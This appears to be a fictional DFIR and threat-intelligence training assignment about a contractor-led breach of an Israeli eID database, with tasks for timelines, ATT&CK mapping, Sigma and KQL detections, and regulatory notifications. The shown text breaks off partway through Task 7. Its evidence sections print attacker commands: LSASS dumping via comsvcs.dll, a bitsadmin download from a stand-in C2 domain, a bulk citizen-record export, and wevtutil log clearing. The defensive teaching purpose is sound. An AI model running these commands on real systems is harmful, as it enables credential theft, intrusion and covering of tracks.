# Assignment 5: Reactive CTI — Government Supply Chain Incident and eID Data Breach Assessment

> **Sector:** Israeli Government / National Digital Services  
> **Organization Type:** National government agency — critical national infrastructure  
> **Regulatory Framework:** INCD Critical Infrastructure Directive (INCD-CID), Israeli Biometric Database Law (5769-2009), Israeli Privacy Protection Law (PPL), MATZBEN Government Security Standard  
> **Scenario Type:** Reactive (post-incident) — supply chain compromise leading to eID data exfiltration  
> **Estimated Effort:** 45–65 hours  
> **Level:** Senior CTI Analyst / DFIR Lead

---

## Preface

This assignment is intentionally more complex than a standard incident investigation. Government incidents introduce legal, political, and inter-agency constraints that do not appear in private-sector DFIR. You will be required to reason about classified evidence you cannot directly access, coordinate with INCD under a statutory notification clock, and produce deliverables that may be reviewed by a Knesset committee. Every analytical judgment must be defensible under public scrutiny.

All organizations, individuals, domains, and IP addresses in this scenario are fictional and created solely for educational purposes.

---

## Section 1: Organizational Context

### 1.1 Organization Profile

**Organization:** National Digital Services Authority (NDSA) — *HaRashut LeShirutim Digitaliyim*  
**Type:** Israeli government agency under the Ministry of Digital Transformation  
**Mission:** Operate national e-government infrastructure serving all 9.5 million Israeli citizens  
**Headquarters:** Jerusalem, Government Campus, Building 4  
**Founded:** 2021 (carved out of the Israel Lands Administration following the Digital Israel Initiative)  
**Staff:** 1,400 employees + ~300 contractor personnel from 12 approved vendors  
**Annual Budget:** ₪2.1 billion (~$575M USD)

**Core Systems Operated:**
| System | Description | Citizens Served |
|---|---|---|
| **GovID Platform** | National eID authentication gateway | 9.5M |
| **VRID (Verification & Registry Identity Database)** | Central biometric verification registry | 9.5M |
| **OneGov Portal** | Single sign-on for 47 government digital services | 6.2M active |
| **BenefitsIL** | Social benefit payment processing | 2.1M |
| **VotingReg** | Electoral roll maintenance | 6.8M eligible voters |
| **Ministry Integration Bus (MIB)** | Secure API layer to 22 ministries | 22 ministry systems |

**Network Architecture:**
- **GOVNET Classified Segment:** Airgapped segment hosting VRID biometric database and classified ministry data feeds; data diode connectivity to internet-connected segment
- **GOVNET Operational Segment:** Internet-connected government network; OneGov portal, API gateways, contractor access zones
- **Contractor DMZ:** Isolated VLAN segment for vendor remote access; single jump host per vendor; access controlled by NDSA's Privileged Access Management (PAM) system
- **SIEM:** Elastic Security 8.12, deployed in hybrid mode (operational segment logs to cloud-hosted tenant; classified segment logs to on-premise instance)

**Regulatory Obligations:**
- **INCD-CID:** Designated critical national infrastructure; INCD liaison officer embedded full-time at NDSA
- **Israeli Biometric Database Law (5769-2009):** Any access to biometric records requires dual authorization; data breach triggers 8-hour notification to Biometric Database Authority (BDA)
- **Israeli PPL:** Large-scale personal data breach triggers notification to Privacy Protection Authority (PPA) and affected individuals
- **MATZBEN:** Government security standard for classified system management; secret clearance required for GOVNET classified access
- **Knesset Oversight:** Knesset Interior Committee has oversight authority over NDSA; data breaches may trigger mandatory committee appearance within 14 days

### 1.2 Key Personnel

| Role | Name | Access Level | Relevant Notes |
|---|---|---|---|
| Director-General | Dr. Ayelet Shamir | Top Secret / GOVNET | Political appointee; reports to Minister of Digital Transformation |
| CISO | Col. (Res.) Dror Nativ | Top Secret / GOVNET | Former IDF Unit 8200 officer; 18 months in role |
| Legal Counsel | Tamar Goldstein | Secret | Former PPA regulator; expert in Biometric Database Law |
| IR Lead | Shai Rotenberg | Secret | CERT-IL alumnus; 7 years government DFIR |
| INCD Liaison Officer | Lt. Col. (Res.) Oren Friedman | Top Secret (INCD) | Embedded from INCD; holds classified INCD threat picture |
| SOC Manager | Gila Ben-Moshe | Secret | Runs 24/7 SOC; 12 analysts on three shifts |
| Contractor Liaison | Ilan Vardi | Confidential | Manages vendor relationships; no technical access |

### 1.3 Contractor Profile: HavayaIT Systems Ltd.

**Vendor:** HavayaIT Systems Ltd., Tel Aviv  
**Contract Scope:** Infrastructure operations and maintenance for NDSA GOVNET Operational Segment; 4-year contract signed June 2022; value ₪84M  
**Personnel Count:** 38 HavayaIT employees hold NDSA contractor access  
**Cross-Agency Access:** HavayaIT also holds contracts with the Israel Tax Authority (ITA) and the Ministry of Interior (MoI) under separate contracts with different access controls  
**NDSA Access Type:** Remote access via Contractor DMZ jump host JUMPHOST-CONTRACTOR-01; PAM-controlled; session recording enabled  

**Key HavayaIT Personnel at NDSA:**
| Name | Role | NDSA Access | Notes |
|---|---|---|---|
| Amir Halevi (a.halevi) | Senior Infrastructure Engineer | Contractor DMZ + Operational Segment (read/write) | 6 years on NDSA contract; holds TS/Cleared for some classified work |
| Yoav Stern (y.stern) | Network Engineer | Contractor DMZ (read only) | Recently onboarded June 2024 |
| Rivka Azulay (r.azulay) | NDSA Account Manager | No technical access | Contract management only |

---

## Section 2: Incident Narrative

### 2.1 Timeline of Events

**Phase 0: Pre-incident intelligence (10 March 2025)**

INCD Liaison Officer Lt. Col. Friedman receives a classified TLP:RED advisory from INCD regarding an Iranian-nexus threat cluster's targeting of Israeli government contractor supply chains. The advisory specifically mentions adversary interest in biometric data held by civilian government agencies. Due to classification level and handling procedures, this advisory is shared only with the DG, CISO, and Friedman himself. The NDSA SOC is not briefed. No specific NDSA indicators are included in the advisory.

Additionally, 10 days prior to the detected incident, INCD conducted a classified red team exercise against NDSA's classified segment under a separate legal authority (INCD-CID Section 9 exercise). Artifacts from this exercise remain in NDSA systems during the incident investigation window. The CISO and DG know about this exercise; IR Lead Rotenberg does not, and the INCD liaison is instructed to handle the deconfliction question "carefully."

**Phase 1: Initial compromise — HavayaIT contractor (12 March 2025)**

At 09:47 IST, HavayaIT employee Amir Halevi receives a spearphishing email at his personal Gmail account (`amir.halevi.work@gmail[.]com`) — not his corporate HavayaIT email. The email appears to be from the Israel Government Procurement Portal (fictitious lookalike domain `gov-procurement-il-portal[.]net`) informing him of a mandatory vendor credential update for NDSA contract renewal. The phishing page is an AiTM (Adversary-in-the-Middle) proxy kit targeting the HavayaIT Microsoft 365 tenant.

Halevi authenticates. The threat actor captures his HavayaIT M365 session token. Halevi's corporate account is now compromised. No MFA on the Halevi M365 account — HavayaIT's IT policy required MFA but Halevi had an exemption on file due to a phone replacement incident in January 2025.

From Halevi's compromised M365 mailbox, the threat actor spends 3 days (12–15 March) reading emails, mapping NDSA access procedures, and identifying the VPN credential for NDSA contractor access. The NDSA contractor VPN does use MFA (TOTP), but Halevi's TOTP seed is backed up in his Gmail account (personal shadow IT practice). With the M365 session, the actor cannot directly read Gmail, but finds a forwarded confirmation email in M365 containing the TOTP seed string Halevi emailed to himself.

**Phase 2: NDSA contractor access (17 March 2025, 01:44 IST)**

Source IP: 203.0.113.115 (Turkish IP, attributed to a residential VPN exit node registered under a fictitious persona; OSINT shows this IP cluster previously appeared in a ClearSky report on Iranian-nexus operations)

The threat actor authenticates to NDSA contractor VPN using Halevi's credentials and TOTP from 203.0.113.115 at 01:44 IST. VPN session is established to Contractor DMZ.

From the Contractor DMZ, the actor accesses JUMPHOST-CONTRACTOR-01 using Halevi's AD credentials at 01:51 IST. PAM session recording starts. Session recording shows reconnaissance: `net user`, `net group "Domain Admins"`, `ipconfig /all`, `nslookup vrid-srv-01.govnet.ndsa.gov.il`.

At 02:03 IST, the actor attempts to pivot from JUMPHOST-CONTRACTOR-01 to VRID-SRV-01 (eID Verification & Registry Identity Database server, on GOVNET Operational Segment). This succeeds because Halevi's account has a legitimate service-level access permission to VRID-SRV-01 for maintenance operations — a permission that had been provisioned 8 months earlier for a database migration project and was never revoked.

**Phase 3: VRID-SRV-01 access and data exfiltration (17–18 March 2025)**

On VRID-SRV-01, the actor achieves local SYSTEM access via a vertical privilege escalation using a known CVE (CVE-2024-XXXX — Windows Print Spooler variant, unpatched on VRID-SRV-01 due to a 6-month patch backlog on government servers under MATZBEN change control requirements).

From SYSTEM context:
- 02:18 IST: LSASS memory dump attempt via `comsvcs.dll` (Task Manager technique) — partial success; process protections on VRID-SRV-01 partially block; GrantedAccess 0x1410 logged but dump file is corrupted.
- 02:31 IST: Actor deploys a BITS-based downloader (bitsadmin /transfer) to pull a second-stage tool from C2 `govservice-cdn-updates[.]net` / 203.0.113.201. Second-stage is a lightweight data exfiltration agent.
- 02:47 IST: Actor queries VRID database via a legitimate database utility already installed on VRID-SRV-01 (`vrid_query.exe`, an internal NDSA tool). Query: all records for teudat zehut numbers starting with 0–9 (full table scan), limited fields: name, teudat zehut, biometric hash value, last verification date.
- 02:47–04:15 IST: Database export runs. 340,218 records extracted to a staging directory on VRID-SRV-01 (`C:\Windows\Temp\svchost_cache\`).
- 04:15–05:33 IST: Staged data exfiltrated via BITS job to C2 203.0.113.201 (HTTPS/443) in 8 chunks of ~40,000 records each.
- 05:48 IST: Actor clears Windows Event Logs (Security, System, Application) on VRID-SRV-01 using `wevtutil cl`. SIEM log gap: 02:00–05:48 IST on VRID-SRV-01 (Winlogbeat agent stops sending after log clear). SIEM does not alert on log gap immediately — gap detection rule has a 12-hour quiet period configuration bug.
- 05:51 IST: Actor closes VPN session. Total dwell time on NDSA network: 4 hours 7 minutes.

**Phase 4: Detection (18 March 2025, 14:33 IST)**

NDSA SOC analyst notices anomaly during routine morning review: VRID-SRV-01 has a 9.5-hour log gap in Elastic SIEM (last event 02:00 IST; events resume after Winlogbeat agent auto-restart at 11:34 IST). Analyst creates a priority-2 ticket.

Separately, at 14:15 IST, the NDSA database team flags an anomaly in VRID database access logs: a full-table query at 02:47 IST by service account `SVC-HAVAYAIT-MAINT` (Halevi's maintenance service account) — a query pattern not consistent with any scheduled maintenance job.

IR Lead Rotenberg is notified at 14:33 IST. By 15:15 IST, he has correlated both indicators and escalated to CISO Nativ as a probable data breach.

**Phase 5: Post-detection cascade (18–20 March 2025)**

- **15:45 IST, 18 March:** CISO Nativ notifies DG Dr. Shamir. Friedman's 8-hour INCD notification clock begins (INCD-CID requires notification within 8 hours of confirmed or probable breach of CII systems). However, Friedman is in a classified briefing and unavailable until 17:00 IST.
- **17:00 IST:** Friedman briefed. Sends INCD preliminary notification. INCD begins parallel investigation — this creates an evidence custody complication.
- **19:30 IST:** Legal Counsel Goldstein advises that the Biometric Database Law triggers a separate notification obligation to the Biometric Database Authority (BDA) within 8 hours of discovery of biometric data breach. Clock started at 15:45 IST; must notify BDA by 23:45 IST.
- **23:30 IST:** BDA notification sent.
- **00:04 IST, 19 March:** Breaking news on Walla news site: "Sources: Government database with citizen biometric data may have been compromised." Source unknown; newsroom had been tipped anonymously.
- **09:00 IST, 19 March:** Knesset Interior Committee requests NDSA appearance within 7 days. Minister of Digital Transformation's office calls DG's office "concerned about political exposure."
- **20 March:** INCD parallel forensics team arrives at NDSA. Evidence access must now be coordinated through a joint protocol. INCD team has classified context Rotenberg does not; Rotenberg has operational DFIR context INCD team lacks.

### 2.2 Available Evidence

#### Evidence Set A: SIEM (Elastic Security 8.12 — Operational Segment Tenant)

**Available log sources (operational segment):**
- Windows Event Logs from JUMPHOST-CONTRACTOR-01 (Winlogbeat): available, no gaps
- Windows Event Logs from VRID-SRV-01 (Winlogbeat): **9.5-hour gap (02:00–11:34 IST)**; events before and after gap available
- NDSA Contractor VPN (Palo Alto GlobalProtect): full session logs available
- NDSA PAM system (CyberArk): full session metadata (start/stop, commands typed); session recordings available for 90 days
- DNS resolver logs (GOVNET Operational Segment): available
- Network flow data (NetFlow): available for GOVNET Operational Segment; data diode boundary NOT covered
- Firewall logs (Check Point NGFW): available; HTTPS inspection partially enabled (cert pinned apps excluded)

**Log sources NOT available:**
- GOVNET Classified Segment logs (separate on-premise Elastic instance; requires MATZBEN clearance + formal evidence access request)
- HavayaIT internal Microsoft 365 audit logs (HavayaIT must provide; pending legal request)
- Personal Gmail account of Halevi (requires law enforcement involvement)

#### Evidence Set B: PAM Session Recording (CyberArk)

Session ID: `PAM-20250317-0151-HALEVI-01`  
Duration: 01:51:00 IST – 05:51:22 IST (4 hours exactly)  
Recording status: **Captured and intact**  
Access: PAM system on Contractor DMZ; requires PAM admin credentials

Key commands logged (partial — full recording available):

```
[01:51:03] C:\Users\a.halevi> net user /domain
[01:51:14] C:\Users\a.halevi> net group "Domain Admins" /domain
[01:51:22] C:\Users\a.halevi> net group "NDSA-VRID-Admins" /domain
[01:52:00] C:\Users\a.halevi> ipconfig /all
[01:52:44] C:\Users\a.halevi> nslookup vrid-srv-01.govnet.ndsa.gov.il
[02:03:15] C:\Users\a.halevi> mstsc /v:vrid-srv-01.govnet.ndsa.gov.il
[02:18:02] C:\WINDOWS\system32> rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID] C:\Windows\Temp\lsass.dmp full
[02:31:14] C:\WINDOWS\system32> bitsadmin /transfer svcupdate /download /priority normal "https://govservice-cdn-updates[.]net/svc/svchosts.exe" "C:\Windows\Temp\svchost.exe"
[02:31:45] C:\WINDOWS\system32> C:\Windows\Temp\svchost.exe --init
[02:47:08] C:\WINDOWS\system32> vrid_query.exe -q "SELECT name, national_id, biometric_hash, last_verified FROM citizen_records" -o C:\Windows\Temp\svchost_cache\export_
[05:33:22] C:\WINDOWS\system32> wevtutil cl System
[05:33:28] C:\WINDOWS\system32> wevtutil cl Security
[05:33:34] C:\WINDOWS\system32> wevtutil cl Application
[05:51:18] C:\Users\a.halevi> logoff
```

#### Evidence Set C: VPN Logs (Palo Alto GlobalProtect)

```
Timestamp (IST) | User        | Source IP       | Gateway         | Duration   | Bytes In | Bytes Out
----------------|-------------|-----------------|-----------------|------------|----------|-----------
2025-03-17 01:44:12 | a.halevi | 203.0.113.115 | ndsa-vpn-gw-01 | 04:07:10 | 48.2 MB | 892.4 MB
2025-03-15 08:22:01 | a.halevi | 172.16.45.22   | ndsa-vpn-gw-01 | 07:44:33 | 12.1 MB | 4.2 MB
2025-03-13 09:15:44 | a.halevi | 172.16.45.22   | ndsa-vpn-gw-01 | 06:22:11 | 9.7 MB  | 3.1 MB
```

*Note: 172.16.45.22 is a HavayaIT corporate office IP. The 01:44 IST session from 203.0.113.115 is anomalous on all dimensions: time, source IP, and outbound data volume (892.4 MB vs. normal 3–4 MB).*

#### Evidence Set D: VRID-SRV-01 Windows Event Logs (pre-gap and post-gap)

**Pre-gap (until 02:00 IST):**

| EventID | Time (IST) | Account | Description |
|---|---|---|---|
| 4624 | 02:03:44 | A.HALEVI | Logon Type 10 (Remote Interactive / RDP) from JUMPHOST-CONTRACTOR-01 |
| 4688 | 02:18:01 | A.HALEVI (elevated) | New Process: `rundll32.exe` parent: `cmd.exe`; CommandLine: `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump...` |
| 4688 | 02:31:14 | SYSTEM | New Process: `bitsadmin.exe`; CommandLine: `/transfer svcupdate /download...` |
| 4688 | 02:31:45 | SYSTEM | New Process: `svchost.exe` (non-standard path: `C:\Windows\Temp\`); parent: `bitsadmin.exe` |
| 4688 | 02:47:08 | SVC-HAVAYAIT-MAINT | New Process: `vrid_query.exe`; CommandLine: `-q "SELECT name, national_id, biometric_hash..."` |
| 7045 | 02:49:01 | SYSTEM | New service installed: `SvcHostMonitor`; Path: `C:\Windows\Temp\svchost.exe` |

**Log gap: 02:00:00–11:34:15 IST (wevtutil log clear at ~05:33 IST; Winlogbeat agent restarts at 11:34 IST)**

**Post-gap (from 11:34 IST):**

| EventID | Time (IST) | Account | Description |
|---|---|---|---|
| 1102 | 11:34:22 | SYSTEM | Audit log cleared — only post-gap artifact of the clear |
| 4624 | 11:36:01 | SYSTEM | Winlogbeat service restart logon |

*Note: EventID 1102 (Audit log cleared) is a Windows artifact that appears after the clear. The actor did not suppress this event. However, without the gap detection rule working correctly, the SOC missed the significance for 9.5 hours.*

#### Evidence Set E: Network Flow / Firewall Logs

**Suspicious outbound connections from VRID-SRV-01 (17 March 2025):**

| Time (IST) | Src IP | Dst IP | Dst Port | Protocol | Bytes | Verdict |
|---|---|---|---|---|---|---|
| 02:31:14 | 10.20.15.44 | 203.0.113.201 | 443 | HTTPS | 2.1 MB | Allowed |
| 02:31:45 | 10.20.15.44 | 203.0.113.201 | 443 | HTTPS | 0.3 MB | Allowed |
| 04:15:02 | 10.20.15.44 | 203.0.113.201 | 443 | HTTPS | 48.7 MB | Allowed |
| 04:28:17 | 10.20.15.44 | 203.0.113.201 | 443 | HTTPS | 51.2 MB | Allowed |
| 04:39:44 | 10.20.15.44 | 203.0.113.201 | 443 | HTTPS | 49.8 MB | Allowed |
| 04:51:03 | 10.20.15.44 | 203.0.113.201 | 443 | HTTPS | 50.1 MB | Allowed |
| 05:02:31 | 10.20.15.44 | 203.0.113.201 | 443 | HTTPS | 49.9 MB | Allowed |
| 05:14:48 | 10.20.15.44 | 203.0.113.201 | 443 | HTTPS | 50.3 MB | Allowed |
| 05:26:05 | 10.20.15.44 | 203.0.113.201 | 443 | HTTPS | 48.8 MB | Allowed |
| 05:33:22 | 10.20.15.44 | 203.0.113.201 | 443 | HTTPS | 12.4 MB | Allowed |

*Total exfiltrated via HTTPS to 203.0.113.201: ~413 MB (8 data chunks + initial download + small final chunk)*

**DNS queries from VRID-SRV-01 (17 March 2025):**

```
02:31:12 IST  VRID-SRV-01 → DNS resolver  govservice-cdn-updates[.]net  A  → 203.0.113.201
02:31:12 IST  VRID-SRV-01 → DNS resolver  govservice-cdn-updates[.]net  A  → 203.0.113.201
04:14:55 IST  VRID-SRV-01 → DNS resolver  govservice-cdn-updates[.]net  A  → 203.0.113.201
[repeated 8 times during exfil window]
```

#### Evidence Set F: INCD Red Team Artifacts (Complicating Factor)

INCD red team exercise (08 March 2025, classified):
- Exercise scope: GOVNET Classified Segment only
- Technique used: BITS-based persistence (same technique as the actual threat actor)
- Artifact remaining in GOVNET Classified Segment: a BITS job named `WinUpdate_Maintenance` pointing to an INCD-controlled IP (not 203.0.113.201)
- This artifact appears in Classified Segment logs only — NOT in Operational Segment logs

The complication: Rotenberg does not know about the exercise. When Friedman tells him there are "some INCD-related artifacts in the classified segment logs that should be disregarded," Rotenberg must decide how to handle the DFIR methodology implications — you cannot validate forensic chain of custody if artifacts from an authorized exercise are present but unexplained.

### 2.3 Complicating Factors (7 Items)

**CF-01: INCD red team exercise artifacts (deconfliction problem)**

INCD's 08 March classified exercise used BITS-based techniques. Rotenberg finds a BITS persistence artifact reference in a classified log summary provided by Friedman. Friedman says to "note it as authorized activity." But Rotenberg cannot independently verify this without clearance to review the exercise records, which requires a formal INCD access request (5-business-day timeline). Meanwhile, INCD's parallel forensics team treats the artifact as out-of-scope but will not explain why to Rotenberg's team in writing.

*CTI implication: Your forensic timeline and attribution methodology must explicitly account for this artifact. Unverified "authorized activity" claims cannot be treated as fact without documented evidence.*

**CF-02: HavayaIT cross-agency access creates ambiguity about breach scope**

HavayaIT holds contracts with ITA and MoI using different credential sets. Halevi's NDSA credentials are confirmed compromised. His ITA and MoI credentials are on separate systems. However, the threat actor had access to Halevi's full M365 mailbox for 5 days (12–17 March). NDSA contractor VPN credentials are stored in email — what about ITA and MoI credentials? The full scope of the breach may extend beyond NDSA.

*CTI implication: Your assessment scope must include an explicit "out-of-scope but flagged" section. Failure to flag cross-agency risk is a reportable omission in government DFIR.*

**CF-03: GOVNET data diode boundary — classified segment not forensically accessible**

VRID-SRV-01 (Operational Segment) is confirmed compromised. The VRID biometric database holds operational-level records. The GOVNET Classified Segment holds additional biometric records with higher classification (facial recognition, security clearance linkages). The data diode between segments should prevent outbound exfiltration from the classified side. However, VRID-SRV-01 has a read-only data feed FROM the classified segment. Did the threat actor access any data that originated in the classified segment but was resident on VRID-SRV-01?

*CTI implication: The scope of potentially compromised data cannot be confirmed without classified segment forensics. Your report must state this as an open question with confidence level.*

**CF-04: INCD 8-hour notification clock, officer unavailable**

At 15:45 IST on 18 March, the incident is confirmed. INCD-CID requires notification within 8 hours (by 23:45 IST). Friedman is in a classified briefing until 17:00. The CISO cannot make the INCD notification without Friedman's coordination — the notification format requires Friedman's INCD unit code. A delay in notification due to Friedman's unavailability is a technical violation of INCD-CID Section 7(b). The actual notification is sent at 17:00, well within the window, but the administrative gap represents a process vulnerability.

*CTI implication: Your assessment should include a timeline of notification compliance; failures to comply with notification obligations — even administrative ones — are findings, not footnotes.*

**CF-05: Media story breaks before notifications are complete**

At 00:04 IST on 19 March, Walla publishes a story about a government biometric database breach. This is before the PPL individual notification to affected citizens has been issued (which may take days to prepare). The source of the media tip is unknown. NDSA must now manage simultaneous: technical DFIR, INCD coordination, BDA notification, PPL notification, Knesset committee preparation, and public communications — all under a media spotlight that is running faster than the investigation.

*CTI implication: Your deliverables must explicitly address what can and cannot be stated publicly at the time of your report. Premature public disclosure of investigation specifics can compromise ongoing law enforcement cooperation.*

**CF-06: Knesset oversight creates public accountability pressure**

Knesset Interior Committee requests NDSA appearance within 7 days. The committee will ask whether NDSA knew about the threat in advance (the INCD TLP:RED advisory from 10 March). The answer is: yes, the DG and CISO knew about the advisory, but the SOC was not briefed. This is a material finding about internal information sharing failures that will be politically sensitive. Your report is a potential committee exhibit.

*CTI implication: Analytical products created during the investigation may be subpoenaed or requested under the Freedom of Information Law (Chok HaChofesh LeInformatsia). Scope your reports accordingly — note what is classified and what is not, and what was known by whom and when.*

**CF-07: Biometric Database Law separate notification obligation — BDA vs. PPA dual track**

The Biometric Database Law creates a notification obligation to the BDA (Biometric Database Authority) separate from the PPL obligation to the PPA. The BDA requires: notification within 8 hours, preliminary incident report within 24 hours, and full forensic report within 30 days. The PPA requires: notification within 72 hours (aligned with PPL), public notification to affected individuals within a "reasonable timeframe." These two regimes have different technical thresholds, different required disclosures, and different enforcement authorities. Managing them simultaneously without contradicting yourself requires precise document control.

---

## Section 3: Tasks

### Task 1: Multi-Host Timeline Reconstruction (Mandatory)

Build a complete incident timeline spanning all four forensic phases: initial contractor compromise (HavayaIT M365, 12 March), NDSA VPN access, VRID-SRV-01 access and exfiltration, and detection.

**Requirements:**

1. Produce a unified timeline table with columns: `Timestamp (IST)`, `System/Source`, `Event Type`, `Account`, `Indicator`, `Confidence`, `Notes`. Minimum 35 events.

2. Identify and explain all **forensic gaps**: the 9.5-hour VRID-SRV-01 log gap; the 5-day M365 access window for which you have no direct forensic artifacts; the classified segment uncertainty.

3. For each gap, state: (a) what evidence could close the gap if obtained; (b) what the gap's impact is on your confidence in the timeline; (c) whether the gap changes the potential scope of breach.

4. Explicitly address **Complicating Factor CF-01** (INCD red team artifact): document how you distinguish authorized exercise artifacts from adversary artifacts, and what your methodology is when you cannot independently verify the "authorized" claim.

5. Determine the **dwell time** with confidence bounds: best case (confirmed first adversary action to containment), worst case (potential earliest undetected access).

6. Calculate total exfiltrated data: records × approximate bytes per record; reconcile with the 413 MB network flow figure and explain any discrepancy.

---

### Task 2: ATT&CK Mapping and TTP Analysis

Map all observed adversary behaviors to MITRE ATT&CK Enterprise.

**Requirements:**

1. Complete ATT&CK mapping table with columns: `Tactic`, `Technique ID`, `Technique Name`, `Sub-technique`, `Evidence`, `Confidence`, `Detection Gap?`. Minimum 12 distinct technique mappings.

2. For **each technique**, identify:
   - Whether a detection exists in NDSA's Elastic SIEM
   - Whether the detection fired during the incident
   - The specific reason for detection failure if the detection exists but did not fire

3. Identify the **technique that created the largest detection gap** and explain why it was missed despite the PAM session recording capturing it.

4. Map the **supply chain component** specifically: the initial AiTM phishing of Halevi is not directly observable in NDSA's SIEM (it happened against HavayaIT's M365 tenant). How do you document a technique that is confirmed to have occurred but for which you have no direct forensic artifacts under your custody?

5. Apply the **Admiralty Scale** to the overall kill chain: rate each phase (source reliability, information credibility) and provide a combined assessment for the full attack narrative.

6. Write a **2-paragraph analyst note** on whether the LSASS `comsvcs.dll` attempt with GrantedAccess 0x1410 and the BITS downloader combination is distinctive tradecraft that can be used for future detection or attribution. Note the gap problem (corrupt dump file).

---

### Task 3: Threat Actor Assessment and Attribution Discipline

Produce a structured threat actor assessment following CTI tradecraft standards.

**Requirements:**

1. Write a **Threat Actor Assessment** section with the following structure:
   - Campaign Overview (what happened, when, where)
   - Tradecraft Summary (techniques and tools observed)
   - Victim Selection Logic (why NDSA, why biometric data, why supply chain approach)
   - Infrastructure Assessment (203.0.113.115, 203.0.113.201, `govservice-cdn-updates[.]net` — what can be determined from OSINT alone)
   - Attribution Assessment (confidence level, reasoning, what evidence would change the assessment)

2. The adversary's use of AiTM phishing against a contractor's personal email account, followed by supply chain pivot to government infrastructure, has been documented by ClearSky Cyber Security in a report describing Iranian-nexus operations against Israeli civilian government targets. Apply **attribution discipline**:
   - What overlap exists between the observed tradecraft and publicly-documented Iranian-nexus tradecraft?
   - What is the minimum confidence level you can responsibly state?
   - What evidence is ABSENT that would be needed to raise confidence?
   - Provide a model attribution statement that a senior analyst could sign off on.

3. Assess **adversary intent**: was the biometric data exfiltration consistent with intelligence collection (state actor), financial crime (data broker), or operational purposes (identity spoofing for future operations)? Provide three hypotheses with confidence ratings. Explicitly address which hypothesis the evidence best supports and why.

4. Produce an **Infrastructure Analysis** section: for each indicator (IP, domain), document: registration details (if OSINT-derivable), hosting provider, known prior use in threat reporting, confidence that the indicator is adversary-controlled (vs. compromised third-party infrastructure), and recommended remediation action.

5. Write a **one-page executive summary** appropriate for the DG and Minister of Digital Transformation — no jargon, no ATT&CK IDs, no technical indicators. Focus on: what was taken, what the likely purpose was, what NDSA's legal exposure is, and what is being done. This summary may be released to the Knesset committee.

---

### Task 4: Detection Engineering and Gap Analysis

Design a detection improvement program based on this incident.

**Requirements:**

1. Write **5 Sigma detection rules** for behaviors observed in this incident. For each rule:
   - Rule ID, title, description, log source, condition
   - Mapping to ATT&CK
   - Expected false positive rate and tuning guidance
   - Known limitations (e.g., requires Sysmon; doesn't fire without PAM integration)

   Required rules must cover:
   - BITS job initiating outbound HTTPS to non-standard destination (not Windows Update)
   - RDP lateral movement from Contractor DMZ jump host to Operational Segment (non-business-hours)
   - `vrid_query.exe` executing with full-table SELECT (anomaly on field count)
   - `wevtutil cl` execution followed by Winlogbeat agent restart within 12-hour window
   - VPN logon from non-corporate ASN for a user whose last 30 sessions were from a single corporate ASN

2. Write an **Elastic KQL query** for each of the 5 rules above. Specify the index pattern (e.g., `winlogbeat-*`, `filebeat-*`) and note which fields require enrichment (e.g., ASN lookup, binary path normalization).

3. Identify **3 structural detection gaps** that cannot be addressed with SIEM rules alone — gaps that require architectural changes to the environment. For each, propose the architectural fix and estimate implementation timeline.

4. Design a **Threat Hunting hypothesis** for the scenario: "Iranian-nexus actor is using legitimate contractor access paths to access NDSA systems during off-hours." Write a structured hunting hypothesis with:
   - Pre-condition (what must be true for this to be detectable)
   - Observable (what evidence would confirm the hypothesis)
   - Hunting query (KQL or EQL)
   - Expected false positive population
   - Kill conditions (criteria for closing the hunt as negative)

5. Address the **12-hour gap detection rule bug**: the quiet-period configuration flaw that prevented the SIEM from alerting on the 9.5-hour log gap. Write a corrected rule that would have fired within 30 minutes of the gap beginning, and explain why the original configuration exists (hint: legitimate scheduled maintenance creates gaps of up to 2 hours; the 12-hour window was intended to suppress these but was too broad).

---

### Task 5: Regulatory Compliance and Notification Analysis

Map the incident to legal obligations and produce draft notifications.

**Requirements:**

1. Produce a **Regulatory Obligation Matrix** with columns: `Regulation`, `Triggering Event`, `Deadline`, `Notification Target`, `Required Content`, `Status (Met/At Risk/Missed)`, `Evidence`. Cover all applicable obligations:
   - INCD-CID Section 7 (8-hour notification)
   - Biometric Database Law (8-hour BDA notification, 24-hour report, 30-day full report)
   - PPL (72-hour PPA notification, individual notification)
   - MATZBEN (classified system incident reporting — separate track)

2. Draft the **INCD-CID preliminary incident notification** (the form submitted at 17:00 IST on 18 March). Include all required fields: incident classification, systems affected, estimated data scope, current containment status, and contact information. Mark any fields where information was unknown at time of notification.

3. Write a **legal risk memo** (2 pages maximum) for Tamar Goldstein covering:
   - Administrative fine exposure under PPL (Article 17C)
   - Potential Biometric Database Law violation exposure (unauthorized access to biometric data by non-authorized party is a criminal offense under the law)
   - INCD administrative sanction exposure if notification had been delayed past 8-hour window
   - Knesset committee cooperation obligations vs. investigation confidentiality
   - Recommend a single overarching communications strategy that minimizes legal exposure across all four regulatory tracks simultaneously

4. Address **Complicating Factor CF-06** (Knesset committee question about advance knowledge): the DG and CISO received a TLP:RED advisory on 10 March warning about Iranian-nexus targeting of government contractor supply chains. The SOC was not briefed. Write a factual, defensible paragraph (to be included in the committee testimony preparation document) that accurately states what was known, when, and by whom — without omitting material facts or making the DG look politically negligent.

---

### Task 6: Breach Scope and Affected Individual Analysis

Quantify the breach and design the notification program.

**Requirements:**

1. Confirm the **exact number of affected individuals**: the database query exported records for all teudat zehut numbers 0–9. Explain what this population likely includes. Note any sub-populations with elevated sensitivity (e.g., minors, individuals with security clearances whose biometric hash is now known to the adversary).

2. Assess the **harm potential** of the compromised data fields: name + 9-digit teudat zehut + biometric hash + last verification date. For each field:
   - What can an adversary do with this field alone?
   - What can an adversary do when combining this field with other stolen datasets (e.g., from prior Israeli data breaches)?
   - What is the residual harm even if the adversary's C2 infrastructure is taken down today?

3. Write a **notification letter** to affected citizens in Hebrew and English. The letter must: acknowledge the breach without disclosing investigation-sensitive information; explain what data was taken; explain the harm potential honestly; provide concrete next steps for citizens to protect themselves (note that Israeli biometric data cannot be "changed" like a password); and provide contact information for NDSA's breach response hotline.

4. Estimate the **biometric hash spoofing risk**: if an adversary has the biometric hash value (but not the underlying biometric), can they re-use it to bypass NDSA's GovID authentication? Document what additional access or capability they would need, and recommend an emergency GovID platform countermeasure that can be deployed in less than 72 hours.

---

### Task 7: Inter-Agency Coordination and Post-Incident Program Recommendations

Produce a lessons-learned and programmatic improvement report.

**Requirements:**

1. Write a **Lessons Learned Report** (4 pages maximum) covering:
   - Root causes (technical: unrevoked permissions, unpatched CVE, M365 MFA exemption; process: internal TLP:RED advisory not shared downward; configuration: 12-hour quiet period bug)
   - Contributing factors (Friedman's unavailability; media tip source)
